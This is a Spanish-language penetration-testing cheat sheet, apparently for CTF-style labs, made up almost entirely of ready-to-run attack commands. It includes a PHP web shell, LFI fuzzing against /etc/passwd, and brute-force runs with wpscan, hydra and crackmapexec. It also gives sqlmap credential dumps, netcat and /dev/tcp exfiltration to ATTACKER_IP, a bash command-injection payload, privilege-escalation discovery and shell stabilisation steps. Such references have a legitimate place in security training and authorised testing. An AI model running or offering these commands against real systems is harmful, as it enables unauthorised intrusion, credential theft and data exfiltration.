# NMAP

Visualizar puertos abiertos de una maquina:

```shell
nmap -sS -p- --open --min-rate 5000 -vvv -n IP
```

# WORDPRESS

Enumeración de plugins de un sitio web:

```shell
wpscan --url http://domain/ -e ap
```

Enumeración de temas de un sitio web:

```shell
wpscan --url http://domain/ -e at
```

Enumeracion de usuarios:

```shell
wpscan --url http://domain/ -e u
```

Realizar ataque de fuerza bruta una vez que se ha encontrado el usuario:

```shell
wpscan --url http://domain/ --usernames user --passwords wordlist
```

# JOOMLA

Escaneo de la página web:

```shell
joomscan -u http://IP/
```

# FUZZING

Descubrimiento de directorios:

```shell
gobuster dir -u http://domain -w wordlist -x php,html,txt,bak
```

```shell
wfuzz -c -w wordlist --hc 404 -u http://domain 
```

```shell
feroxbuster --url http://domain -w wordlist -x php,html,txt,bak             
```

Descubrimiento de subdominios:

```shell
wfuzz -c -w wordlist --hc 404 -u http://domain -H "Host: FUZZ.domain" 
```

Descubrimiento de paramétros con los que poder realizar LFI:

```shell
wfuzz -c -w wordlist --hc 404 -u http://domain/page.php?FUZZ=/etc/passwd
```

```shell
wfuzz -c -w wordlist --hc 404 -u http://domain/page.php?test=FUZZ
```

# PHP

Ejecución de comandos en una máquina subiendo un fichero:

```shell
<?php
       system($_GET['cmd']);
?>
```

# FILE CRACKING

Extraer passphrase de una imagen:

```shell
stegseek extract -sf image -wl wordlist
```

```shell
steghide extract -sf image
```

Extraer hashes:

```shell
john -w=wordlist hash
```

Si es MD5 podemos utilizar:

```shell
john --format=Raw-MD5 -w=wordlist hash
```

Si deseamos utilizar hashcat lo primero que necesitaremos será conocer el modo, este aparece en la columna de #:

```shell
hashcat hash wordlist
```

Una vez que sepamos el modo podremos crackearlo:

```shell
hashcat -m mode hash wordlist
```

# SMB

Listar recursos compartidos:

```shell
smbclient -N -L //IP
```

Listar recursos compartidos de un usuario:

```shell
smbclient -L IP -U user
```

Entrar al recurso compartido:

```shell
smbclient '\\IP\RESOURCE\' -U user
```

Enumeración de recursos y usuarios:

```shell
enum4linux -a IP
```

Enumeración si conocemos user y password:

```shell
smbmap -u 'user' -p 'pass' -H IP
```

Visualizar el contenido de un recurso:

```shell
smbmap -u 'user' -p 'pass' -H IP -r RESOURCE
```

Descarga de un archivo:

```shell
smbmap //IP/RESOURCE -U user%pass -c 'get file'
```

Conseguir la password de un user por fuerza bruta:

```shell
crackmapexec smb IP -u user -p wordlist | grep -v FAILURE
```

# DESCARGA DE ARCHIVOS DE UN SERVIDOR

Utilizaremos php y python:

```shell
php -r $file = file_get_contents("http://10.129.193.88/flag.txt"); file_put_contents("flag.txt",$file);'
```

```shell
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

# FILE TRANSFER

Utilizando netcat:

```shell
cat file | nc ATTACKER_IP
```

Otra manera de hacerlo si no es un fichero es:

```shell
cat file.zip > /dev/tcp/IP/PORT
```

Desde la IP atacante deberemos ejecutar:

```shell
nc -nlvp PORT > file
```

# IDENTIFY HASHES

Para comprobar los hashes podemos utilizar:

```shell
sha256sum hash
md5sum hash
sha1sum hash
```

Para conocer el tipo de hash usaremos:

```shell
hashid hash
```

```shell
hash-identifier
```

```shell
hashcat hash wordlist
```

# SQLMAP

Obtener las bases de datos disponibles:

```shell
sqlmap -u http://IP/login.html --dbs --batch --forms
```

Visualizar las tablas de una base de datos concreta:

```shell
sqlmap -u http://IP/login.html -D database --tables --batch --forms
```

Visualizar todas las columnas de una tabla:

```shell
sqlmap -u http://IP/login.html -D database -T table --columns --batch --forms
```

Visualizar el valor de dichas columnas:

```shell
sqlmap -u http://IP/login.html -D database -T table -C username,password --batch --forms --dump
```

Visualizar los datos gracias a un fichero:

```shell
sqlmap -r file (--dbs) --dump -batch --level 5 -risk 3
```

# GAIN PRIVILEGES IN A PARAMETER SCRIPT

```shell
a[$(/bin/bash >&2)]
```

# BRUTE FORCE

Obtener password de un usuario para conectarse via SSH:

```shell
hydra -l user -P wordlist ssh://IP
```

Obtener usuario cuando sabemos la password para conectarnos via SSH:

```shell
hydra -L wordlist -p pass ssh://IP
```

Obtener password de una pagina de login donde conocemos el usuario (antes deberemos de interceptar la peticion con BurpSuite para conocer el nombre exacto de los parametros en este caso son username y password):

```shell
hydra -l user -P wordlist IP http-post-form "/login.php:username=medusa&password=^PASS^:Invalid credentials"
```

# CREATE A DICTIONARY

Algunas de las herramientas conocidas son crunch o cupp, pero si queremos hacer un diccionario que contenga palabras de una web usaremos cewl:

```shell
cewl http://page > dictionary
```

# SSH

Generación de claves:

```shell
ssh-keygen -t rsa -b 4096
```

Crear el fichero de authorized_keys:

```shell
cat id.pub > authorized_keys
```

# WAYS TO GAIN PRIVILEGES

Si utilizamos el comando sudo -l podremos saber que podemos ejecutar utilizando el comando sudo y con que usuario:

```shell
sudo -l
```

Si con el comando anterior no tenemos resultados podremos buscar si existe algo con permisos especiales que podemos utilizar para explotar:

```shell
find -perm -4000 2>/dev/null
```

# TTY

A la hora de realizar la intrusion puede que la terminal no este configurada de manera correcta, para ello usaremos los siguientes comandos:

```shell
script /dev/null -c bash
```

```shell
Control Z
```

```shell
stty raw -echo; fg
```

```shell
reset xterm
```

```shell
export TERM=xterm
```

```shell
export SHELL=bash
```

```shell
stty rows 24 columns 126
```

# PROXY TOOLS

Para utilizar comandos cuando estamos realizando pivoting no podremos ejecutarlos de manera normal, deberemos usar proxychains:

NMAP:

```shell
proxychains nmap -sT --top-ports 100 -Pn IP
```

GOBUSTER:

```shell
gobuster dir -u http://IP/ -w wordlist -x php,html,txt,bak --proxy socks5://127.0.0.1:PORT
```

HYDRA:

```shell
proxychains hydra -l user -P wordlist ssh://IP
```

SSH:

```shell
proxychains ssh user@IP
```
